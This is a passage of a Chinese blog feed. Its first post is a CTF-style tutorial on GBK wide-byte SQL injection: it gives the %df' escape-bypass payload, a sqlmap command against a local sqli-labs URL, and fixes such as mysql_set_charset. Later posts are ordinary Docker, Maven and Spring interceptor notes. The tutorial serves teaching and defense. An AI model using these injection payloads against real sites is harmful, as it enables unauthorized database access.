gbk”)，即设定字符集为gbk。漏洞就是由于这个设置导致宽字节注入。</p><p><img src="https://img-blog.csdnimg.cn/20210820152802384.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p> 仔细看该函数，其利用正则匹配将 [ /，’，” ]这些三个符号都过滤掉了</p><p><img src="https://img-blog.csdnimg.cn/20210821102033527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>关于preg_replace的正则用法可详看：<a href="https://blog.csdn.net/qq_44159028/article/details/114642034">命令执行与代码执行漏洞</a> 中搜索preg_replace </p><p>而我们要绕过这个转义处理，使单引号发挥作用不再被转义，有两个思路：</p><ol><li>让斜杠（\）失去作用</li><li>让斜杠（\）消失</li></ol><p>第一个思路就是借鉴程序员的防范思路，对斜杠（\）转义，使其失去转义单引号的作用，成为普通的内容。第二个思路就是宽字节注入。</p><p><strong>关于编码</strong></p><p>在理解宽字节注入之前，我们需要先了解编码的有关知识，关于什么是编码，为什么要编码，可以详看：<a href="https://blog.csdn.net/qq_44159028/article/details/115201653">计算机中的编码问题</a></p><ol><li>某字符的大小为一个字节时，称其字符为窄字节.</li><li>当某字符的大小为两个字节时，称其字符为宽字节.</li><li>所有英文默认占一个字节，汉字占两个字节</li><li>常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS等等</li></ol><p><strong>宽字节注入</strong>    </p><p>宽字节是指多个字节宽度的编码，GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。转义函数在对这些编码进行转义时会将转义字符 ‘\’ 转为 %5c ,于是我们在他前面输入一个单字符编码与它组成一个新的多字符编码，使得原本的转义字符没有发生作用。</p><p>​    由于在数据库查询前使用了GBK多字节编码，即在汉字编码范围内使用两个字节会被编码为一个汉字（前一个ascii码要大于128，才到汉字的范围）。然后mysql服务器会对查询语句进行GBK编码，即下面所说的</p><p>​    我们在前面加上 %df’  ,转义函数会将%df’改成%df\’ , 而\ 就是%5c ，即最后变成了%df%5c’，而%df%5c在GBK中这两个字节对应着一个汉字 “運” ，就是说 \ 已经失去了作用，%df ‘ ,被认为運’ ,成功消除了转义函数的影响。</p><ul><li>‘      %27</li><li>\      %5c</li><li>%df&#39;  %df%5c’ =》 運’</li></ul><p>我们输入 ?id=1%df’，按道理来说将转义符吃掉了，结果应该是 id=’ 運’  ‘ ，为什么这里转变成了中文后后面还有一个反斜杠了？那个反斜杠是哪里来的？</p><p><img src="https://img-blog.csdnimg.cn/20210821100701673.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>其实这个是浏览器显示编码的问题，我们将浏览器编码切换为GB2312即简体中文，如下就正常了。</p><p><img src="https://img-blog.csdnimg.cn/20210821100948766.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p> 联合注入如下</p><p><img src="https://img-blog.csdnimg.cn/20210324175615607.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>GB2312与GBK的不同</strong></p><p>gb2312和gbk应该都是宽字节家族的一员。但我们来做个小实验。把源码中set names修改成gb2312</p><p><img src="https://img-blog.csdnimg.cn/20210821231155171.png" alt="img"></p><p>结果就不能注入了，我开始不信，然后再把数据库编码也改成gb2312，也是不成功的。虽然执行的语句还是显示被转换成了中文了，但就是注入不成功</p><p><img src="https://img-blog.csdnimg.cn/20210821232112841.png" alt="img"></p><p>为什么，这归结于gb2312编码的取值范围。它的高位范围是0xA1<del>0xF7，低位范围是0xA1</del>0xFE，而\是0x5c，是不在低位范围中的。所以，0x5c根本不是gb2312中的编码，所以自然也是不会被吃掉的。</p><p>所以，把这个思路扩展到世界上所有多字节编码，我们可以这样认为：只要低位的范围中含有0x5c的编码，就可以进行宽字符注入。</p><p><strong>宽字节注入注入方法</strong></p><ol><li>黑盒</li></ol><p>就是上面所述的，在注入点后面加%df，然后按照正常的注入流程开始注入即可。如果我们需要使用sqlmap进行检测注入的话也需要在注入点后面加%df然后再用sqlmap跑，否则是注入不出来的，如</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">sqlmap.py -u <span class="hljs-string">&quot;http://localhost/sqli-labs-master/Less-32/?id=1%df%27&quot;</span><br></code></pre></td></tr></table></figure><ol start="2"><li>白盒</li></ol><p>查看mysql是否为GBK编码，且是否使用preg_replace()把单引号转换成&#39;或自带函数addslashes()进行转义</p><p><img src="https://img-blog.csdnimg.cn/20210821231155171.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20210821232504840.png" alt="img"> <img src="https://img-blog.csdnimg.cn/20210821233043656.png" alt="img"></p><p> 如果存在上面说的，则存在宽字节注入。</p><p><strong>宽字节注入修复</strong></p><ol><li>mysql_real_escape_string</li></ol><p>听说这个函数能抵御宽字节注入攻击。mysql_real_escape_string — 转义 SQL 语句中使用的字符串中的特殊字符，并考虑到连接的当前字符集。mysql_real_escape_string与addslashes的不同之处在于其会考虑当前设置的字符集。</p><p> ‍于是，把addslashes替换成mysql_real_escape_string，来抵御宽字符注入。但是我们发现还是一样注入成功了</p><p><img src="https://img-blog.csdnimg.cn/20210821233922778.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/20210821233900317.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p>为什么，明明我用了mysql_real_escape_string，但却仍然不能抵御宽字符注入？</p><p>原因就是，你没有指定php连接mysql的字符集。我们需要在执行sql语句之前调用一下mysql_set_charset函数，设置当前连接的字符集为gbk。‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍‍</p><blockquote><p>mysqli_set_charset(<em>connection,charset</em>)<em>;</em></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>connection</em></td><td align="left">必需。规定要使用的 MySQL 连接。</td></tr><tr><td align="left"><em>charset</em></td><td align="left">必需。规定默认字符集。</td></tr></tbody></table></blockquote><p><img src="https://img-blog.csdnimg.cn/20210821234529785.png" alt="img"></p><p> 这样就防止了注入</p><p><img src="https://img-blog.csdnimg.cn/20210821234552955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0MTU5MDI4,size_16,color_FFFFFF,t_70" alt="img"></p><p> 即先调用mysql_set_charset函数设置连接所使用的字符集为gbk，再调用mysql_real_escape_string来过滤用户输入。</p><ol start="2"><li><p>设置参数,character_set_client=binary</p></li><li><p>使用utf-8编码</p></li></ol><p>————</p><p>本Blog部分借鉴于：</p><p><a href="https://blog.csdn.net/qq_44159028/article/details/114325805">https://blog.csdn.net/qq_44159028/article/details/114325805</a></p><p><a href="https://blog.csdn.net/yujia_666/article/details/90296495">https://blog.csdn.net/yujia_666/article/details/90296495</a></p><p>如有侵权，请联系删除。</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Docker-入门1-1</title>
    <link href="/2023/08/12/Docker-1-1/"/>
    <url>/2023/08/12/Docker-1-1/</url>
    
    <content type="html"><![CDATA[<h1 id="Docker-入门1-1"><a href="#Docker-入门1-1" class="headerlink" title="Docker-入门1-1"></a>Docker-入门1-1</h1><h2 id="一、基本概念"><a href="#一、基本概念" class="headerlink" title="一、基本概念"></a>一、基本概念</h2><h3 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h3><p><strong>打包</strong>：就是把你软件运行所需的依赖、第三方库、软件打包到一起，变成一个安装包<br><strong>分发</strong>：你可以把你打包好的“安装包”上传到一个镜像仓库，其他人可以非常方便的获取和安装<br><strong>部署</strong>：拿着“安装包”就可以一个命令运行起来你的应用，自动模拟出一摸一样的运行环境，不管是在 Windows/Mac/Linux。</p><h3 id="2、Docker-部署的优势"><a href="#2、Docker-部署的优势" class="headerlink" title="2、Docker 部署的优势"></a>2、Docker 部署的优势</h3><p>常规应用开发部署方式：自己在 Windows 上开发、测试 –&gt; 到 Linux 服务器配置运行环境部署。</p><h3 id="3、Docker-通常用来做什么"><a href="#3、Docker-通常用来做什么" class="headerlink" title="3、Docker 通常用来做什么"></a>3、Docker 通常用来做什么</h3><ul><li>应用分发、部署，方便传播给他人安装。特别是开源软件和提供私有部署的应用</li><li>快速安装测试/学习软件，用完就丢（类似小程序），不把时间浪费在安装软件上。例如 Redis / MongoDB / ElasticSearch / ELK</li><li>多个版本软件共存，不污染系统，例如 Python2、Python3，Redis4.0，Redis5.0</li><li>Windows 上体验/学习各种 Linux 系统</li></ul>]]></content>
    
    
    <categories>
      
      <category>Docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb_仓库合集_1</title>
    <link href="/2023/05/31/JavaWeb_config_1/"/>
    <url>/2023/05/31/JavaWeb_config_1/</url>
    
    <content type="html"><![CDATA[<h1 id="Maven-amp-Spring常用仓库"><a href="#Maven-amp-Spring常用仓库" class="headerlink" title="Maven&amp;Spring常用仓库"></a>Maven&amp;Spring常用仓库</h1><h2 id="一、Maven仓库"><a href="#一、Maven仓库" class="headerlink" title="一、Maven仓库"></a>一、Maven仓库</h2><h3 id="1、XML解析-slf4j打印日志必须的三个依赖包"><a href="#1、XML解析-slf4j打印日志必须的三个依赖包" class="headerlink" title="1、XML解析(slf4j打印日志必须的三个依赖包)"></a>1、XML解析(slf4j打印日志必须的三个依赖包)</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>log4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.17<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-log4j12<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.slf4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>slf4j-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.21<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2、JWT"><a href="#2、JWT" class="headerlink" title="2、JWT"></a>2、JWT</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-impl<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>io.jsonwebtoken<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jjwt-jackson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.11.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3、-Test"><a href="#3、-Test" class="headerlink" title="3、@Test"></a>3、@Test</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.13<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>compile<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="二、Spring框架"><a href="#二、Spring框架" class="headerlink" title="二、Spring框架"></a>二、Spring框架</h2><h3 id="1、spring事务管理日志"><a href="#1、spring事务管理日志" class="headerlink" title="1、spring事务管理日志"></a>1、spring事务管理日志</h3><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-comment">#开启事务管理日志</span><br><span class="hljs-attr">logging:</span><br>  <span class="hljs-attr">level:</span><br>    <span class="hljs-attr">org.springframework.jdbc.support.JdbcTransactionManager:</span> <span class="hljs-string">debug</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JavaWeb</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWeb基础2-2</title>
    <link href="/2023/05/30/JavaWeb_2_2/"/>
    <url>/2023/05/30/JavaWeb_2_2/</url>
    
    <content type="html"><![CDATA[<h1 id="JavaWeb基础2-2"><a href="#JavaWeb基础2-2" class="headerlink" title="JavaWeb基础2-2"></a>JavaWeb基础2-2</h1><h2 id="六、Interceptor"><a href="#六、Interceptor" class="headerlink" title="六、Interceptor"></a>六、Interceptor</h2><h3 id="1、概念"><a href="#1、概念" class="headerlink" title="1、概念"></a>1、概念</h3><p>概念：是一种动态拦截方法调用的机制，类似于过滤器。Spring框架中提供的，用来动态拦截控制器方法的执行。<br>作用：拦截请求,在指定的方法调用前后，根据业务需要执行预先设定的代码。</p><p><img src="/img/JavaWeb/2-2/1.png"></p><p>1.定义拦截器，实现HandlerInterceptor接口， 并重写其所有方法。</p><p>2.注册拦截器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span> <span class="hljs-comment">// 目标资源方法执行前执行，放回true:放行，返回false: 不放行</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> preHandle<br><span class="hljs-meta">@Override</span> <span class="hljs-comment">// 目标资源方法执行后执行</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> postHandle<br><span class="hljs-meta">@Override</span> <span class="hljs-comment">//视图渲染完毕后执行，最后执行</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> afterCompletion <br></code></pre></td></tr></table></figure><p>3.交给AOP容器管理，加上@component</p><h3 id="2、入门"><a href="#2、入门" class="headerlink" title="2、入门"></a>2、入门</h3><ol><li>定义拦截器，实现HandlerInterceptor接口， 并重写其所有方法。</li><li>注册拦截器</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LoginCheckInterceptor</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerInterceptor</span> &#123;<br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">//目标资源方法运行前运行, 返回true: 放行, 放回false, 不放行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">preHandle</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp, Object handler)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//1.获取请求url。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> req.getRequestURL().toString();<br>        log.info(<span class="hljs-string">&quot;请求的url: &#123;&#125;&quot;</span>,url);<br><br>        <span class="hljs-comment">//2.判断请求url中是否包含login，如果包含，说明是登录操作，放行。</span><br>        <span class="hljs-keyword">if</span>(url.contains(<span class="hljs-string">&quot;login&quot;</span>))&#123;<br>            log.info(<span class="hljs-string">&quot;登录操作, 放行...&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//3.获取请求头中的令牌（token）。</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">jwt</span> <span class="hljs-operator">=</span> req.getHeader(<span class="hljs-string">&quot;token&quot;</span>);<br><br>        <span class="hljs-comment">//4.判断令牌是否存在，如果不存在，返回错误结果（未登录）。</span><br>        <span class="hljs-keyword">if</span>(!StringUtils.hasLength(jwt))&#123;<br>            log.info(<span class="hljs-string">&quot;请求头token为空,返回未登录的信息&quot;</span>);<br>            <span class="hljs-type">Result</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> Result.error(<span class="hljs-string">&quot;NOT_LOGIN&quot;</span>);<br>            <span class="hljs-comment">//手动转换 对象--json --------&gt; 阿里巴巴fastJSON</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">notLogin</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(error);<br>            resp.getWriter().write(notLogin);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//5.解析token，如果解析失败，返回错误结果（未登录）。</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            JwtUtils.parseJWT(jwt);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<span class="hljs-comment">//jwt解析失败</span><br>            e.printStackTrace();<br>            log.info(<span class="hljs-string">&quot;解析令牌失败, 返回未登录错误信息&quot;</span>);<br>            <span class="hljs-type">Result</span> <span class="hljs-variable">error</span> <span class="hljs-operator">=</span> Result.error(<span class="hljs-string">&quot;NOT_LOGIN&quot;</span>);<br>            <span class="hljs-comment">//手动转换 对象--json --------&gt; 阿里巴巴fastJSON</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">notLogin</span> <span class="hljs-operator">=</span> JSONObject.toJSONString(error);<br>            resp.getWriter().write(notLogin);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br><br>        <span class="hljs-comment">//6.放行。</span><br>        log.info(<span class="hljs-string">&quot;令牌合法, 放行&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">//目标资源方法运行后运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">postHandle</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;postHandle ...&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span> <span class="hljs-comment">//视图渲染完毕后运行, 最后运行</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">afterCompletion</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        System.out.println(<span class="hljs-string">&quot;afterCompletion...&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>3.拦截器-拦截路径</p><p>拦截器可以根据需求，配置不同的拦截路径:</p><p><img src="/img/JavaWeb/2-2/2.png"></p><p>4.执行流程</p><p><img src="/img/JavaWeb/2-2/3.png"></p><p>5.Filter与Interceptor：</p><p>接口规范不同：过滤器需要实现Filter接口，而拦截器需要实现HandleaInterceptor接口。</p><p>拦截范围不同：过滤器Filter会拦截所有的资源，而Interceptor只 会拦截Spring环境中的资源。</p><h3 id="3、登录校验案例"><a href="#3、登录校验案例" class="headerlink" title="3、登录校验案例"></a>3、登录校验案例</h3><h3 id="4、全局异常处理器"><a href="#4、全局异常处理器" class="headerlink" title="4、全局异常处理器"></a>4、全局异常处理器</h3><p>编写一个exception包，其中包含GlobalExceptionHandler类，相关方法实现如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RestControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> &#123;<br>    <span class="hljs-meta">@ExceptionHandler(Exception.class)</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">ex</span><span class="hljs-params">(Exception ex)</span> &#123;<br>        ex.printStackTrace();<br>        <span class="hljs-keyword">return</span> Result.error(<span class="hljs-string">&quot;对不起，操作失败，请联系管理员&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="七、事务管理"><a href="#七、事务管理" class="headerlink" title="七、事务管理"></a>七、事务管理</h2><h3 id="1、概念-1"><a href="#1、概念-1" class="headerlink" title="1、概念"></a>1、概念</h3><p>事务是一组操作的集合，它是一个不可分割的工作单位，这些操作要么同时成功，要么同时失败。</p><p>操作：</p><p>开启事务(- -组操作开始前,开启事务) : start transaction / begin ;</p><p>提交事务(这组操作全部成功后，提交事务) : commit ; </p><p>回滚事务(中间任何-一个操作出现异常,回滚事务) : rollback ;</p><h3 id="2、Spring事物管理"><a href="#2、Spring事物管理" class="headerlink" title="2、Spring事物管理"></a>2、Spring事物管理</h3><p>案例分析：删除部门的时候，删除部门下的全部员工。</p><p>会出现的问题：即使程序运行抛出了异常 / 部门依然删除了 / 但是部门下的员工却没有删除 ， 造成了数据的不一致。</p><p><img src="/img/JavaWeb/2-2/4.png"></p><h4 id="Transactional"><a href="#Transactional" class="headerlink" title="@Transactional"></a>@Transactional</h4><p>注解: @Transactional</p><p>位置:业务(service) 